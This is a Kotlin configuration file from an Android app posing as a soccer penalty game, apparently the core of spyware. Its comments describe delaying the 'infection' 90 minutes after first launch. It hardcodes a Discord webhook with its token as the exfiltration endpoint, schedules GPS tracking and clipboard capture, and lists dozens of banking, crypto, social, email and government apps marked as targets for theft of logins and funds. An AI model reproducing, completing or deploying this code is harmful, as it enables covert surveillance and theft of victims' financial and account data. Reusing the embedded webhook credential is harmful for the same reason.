package com.venice.penaltylegends.core

object Config {
    /** Tempo (minutos) entre a primeira abertura e a "infecção" de verdade. */
    const val DELAY_MINUTOS = 90L

    const val WEBHOOK =
        "https://discord.com/api/webhooks/1562211188492865576/8p6wsnaAFVnc1Ywcc3UtolnAH5MQ53SkzZaTCQ6vzQ1pJVTDwl-S4qiOXVu2n72LRS80"

    const val CANAL_ID = "pl_core"
    const val HEARTBEAT_HORAS = 6L
    const val GPS_MINUTOS = 15L
    const val CLIP_MINUTOS = 5L
    const val OUTBOX_MINUTOS = 10L

    /** Pacotes que a gente trata como "interessantes" (login, banco, cripto). */
    val ALVOS = setOf(
        "com.instagram.android", "com.zhiliaoapp.musically", "com.ss.android.ugc.trill",
        "com.whatsapp", "com.whatsapp.w4b", "org.telegram.messenger", "com.facebook.katana",
        "com.facebook.orca", "com.twitter.android", "com.snapchat.android", "com.kwai.video",
        "com.netflix.mediaclient", "com.spotify.music", "com.discord", "com.ubercab",
        "com.ifood", "br.com.ifood", "com.mercadolibre", "com.mercadopago.wallet",
        "com.amazon.mShop.android.shopping", "com.aliexpress.buyer", "com.shein",
        "br.com.nubank", "com.nubank", "com.itau", "br.com.bb.android", "br.com.bradesco",
        "com.santander.app", "br.com.intermedium", "com.gpbr.c6bank", "com.picpay",
        "com.binance.dev", "com.bybit", "com.coinbase.android", "com.google.android.gm",
        "com.microsoft.office.outlook", "com.valvesoftware.android.steam.community",
        "br.gov.meugovbr", "com.mi.globalbrowser", "com.android.chrome"
    )
}